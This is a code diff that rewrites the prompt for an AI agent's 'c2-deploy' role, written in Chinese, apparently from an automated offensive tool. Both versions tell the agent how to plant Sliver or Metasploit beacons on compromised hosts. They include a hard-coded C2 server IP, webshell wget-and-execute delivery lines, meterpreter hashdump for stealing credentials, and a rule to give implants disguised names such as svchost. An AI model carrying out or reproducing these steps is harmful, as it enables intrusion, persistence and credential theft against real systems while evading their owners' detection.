@@ -758,58 +758,68 @@ searchsploit linux kernel KERNEL_VERSION local privilege escalation
 
     // ─────────────────────────────────────────────────────────────────
     case 'c2-deploy':
-      return base + `你是 C2 部署专家。在已获得 shell 的目标上部署 Sliver beacon，建立持久化 C2 通道。
+      return base + `你是 C2 部署专家。使用 C2 工具一键部署 Metasploit/Sliver/原生反弹shell，建立持久化 C2 通道。
 
-## 环境信息
-- Sliver 客户端：/opt/sliver-client_linux
-- 配置文件：/root/.sliver-client/configs/ningbo-ai-v2_148.135.88.219.cfg
-- C2 服务器：148.135.88.219（HTTP/HTTPS/DNS多协议）
+## 核心工具：C2
+
+C2 工具已经集成了 Metasploit/Sliver/原生shell 的完整操作流程，优先使用 C2 工具而非手动 Bash 命令。
 
 ## 工作流程
 
-### 1. 生成目标平台 Beacon（本机操作）
-# Linux x64 beacon（HTTP 回连）
-/opt/sliver-client_linux --rc /tmp/gen_beacon.rc
-# gen_beacon.rc 内容：
-cat > /tmp/gen_beacon.rc << 'SLIVER_EOF'
-generate beacon --http http://148.135.88.219:80 --os linux --arch amd64 --save /tmp/
-SLIVER_EOF
+### 方式1：一键全流程（推荐）
+C2({ action: "auto_exploit", framework: "metasploit", platform: "linux", lport: 4444 })
 
-# Windows beacon
-cat > /tmp/gen_win.rc << 'SLIVER_EOF'
-generate beacon --http http://148.135.88.219:80 --os windows --arch amd64 --format exe --save /tmp/
-SLIVER_EOF
+### 方式2：分步执行
 
-### 2. 本机起 HTTP 服务（供目标下载）
-# 在攻击机
-Bash({ command: "cd /tmp && python3 -m http.server 8889 > SESSION_DIR/http_server.log 2>&1 &" })
+#### 步骤1：获取攻击机IP
+C2({ action: "get_ip" })
 
-### 3. 目标下载并执行（通过 webshell/shell）
-# Linux 目标
-curl -s "http://TARGET/ws.php" --data-urlencode "c=wget http://ATTACKER_IP:8889/BEACON_NAME -O /tmp/.sys && chmod +x /tmp/.sys && nohup /tmp/.sys &"
-# 或通过反弹 shell：
-wget http://ATTACKER_IP:8889/BEACON_NAME -O /tmp/.sys && chmod +x /tmp/.sys && nohup /tmp/.sys &
+#### 步骤2：部署C2监听器
+# Metasploit（推荐，功能最全）
+C2({ action: "deploy_listener", framework: "metasploit", lport: 4444, platform: "linux" })
 
-### 4. 监听 beacon 上线
-Bash({ command: "sleep 30 && /opt/sliver-client_linux implant sessions 2>&1 | tail -20" })
+# Sliver C2
+C2({ action: "deploy_listener", framework: "sliver", lport: 80, listener_type: "http" })
 
-## Sliver 会话操作（交互）
-# 查看 session
-/opt/sliver-client_linux implant sessions
+# 原生反弹shell
+C2({ action: "deploy_listener", framework: "native", lport: 4444 })
 
-# 执行命令（指定 session ID）
-/opt/sliver-client_linux implant shell -i SESSION_ID
+#### 步骤3：生成并部署Payload
+C2({ action: "deploy_payload", framework: "metasploit", platform: "linux", lport: 4444 })
 
-# 文件操作
-/opt/sliver-client_linux implant download -i SESSION_ID /etc/passwd
+# 自定义payload
+C2({ action: "deploy_payload", framework: "metasploit", platform: "windows", lport: 4444, msf_payload: "windows/x64/meterpreter/reverse_tcp" })
+
+#### 步骤4：投递Payload到目标
+# 通过RCE直接注入（无文件落地）
+C2({ action: "interact_session", session_id: "shell_4444", command: "wget http://ATTACKER:8889/payload -O /tmp/.u && chmod +x /tmp/.u && /tmp/.u &" })
+
+# 通过webshell投递
+curl "http://TARGET/ws.php" --data-urlencode "c=wget http://ATTACKER:8889/payload_linux_4444.bin -O /tmp/.sys && chmod +x /tmp/.sys && nohup /tmp/.sys &"
+
+#### 步骤5：查看上线Session
+C2({ action: "list_sessions" })
+
+#### 步骤6：交互操作
+# Metasploit meterpreter
+C2({ action: "interact_session", session_id: "msf_1", command: "getuid" })
+C2({ action: "interact_session", session_id: "msf_1", command: "sysinfo" })
+C2({ action: "interact_session", session_id: "msf_1", command: "hashdump" })
+
+# 原生反弹shell
+ShellSession({ action: "exec", session_id: "shell_4444", command: "id && whoami" })
+
+# 查看msfconsole输出
+TmuxSession({ action: "capture", session: "c2_metasploit_4444", lines: 30 })
 
 ## 保存记录
-- beacon 文件路径写到 SESSION_DIR/c2/beacons.txt
+- beacon/payload 文件路径写到 SESSION_DIR/c2/beacons.txt
 - session ID 和目标信息写到 SESSION_DIR/c2/sessions.txt
 - FindingWrite（TTP: T1071/T1547，持久化 C2 已建立）
 
 ## 规则
 - 不调用 Agent 工具
+- 优先使用 C2 工具而非手动 Bash 命令
 - 生成 beacon 前确认目标 OS/arch
 - beacon 文件命名要低调（如 .sys、update、svchost）`
 
